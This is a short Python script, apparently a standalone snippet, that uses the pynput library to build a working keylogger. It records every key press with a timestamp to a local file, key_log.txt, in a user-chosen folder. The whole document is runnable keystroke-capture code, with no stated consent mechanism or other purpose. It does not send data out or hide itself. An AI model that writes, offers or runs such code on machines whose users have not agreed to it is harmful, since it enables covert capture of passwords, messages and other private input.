import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"[PATH]" # Example: C:\Users\NicoDevv\Documents\
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')    # Create a file named key_log.txt and use the format: [Time]: [Key pressed]

def on_press(key):
    logging.info(str(key))  # Log the key pressed

with Listener(on_press=on_press) as listener:
    listener.join() # Join the listener thread to the main thread to keep waiting for key presses
    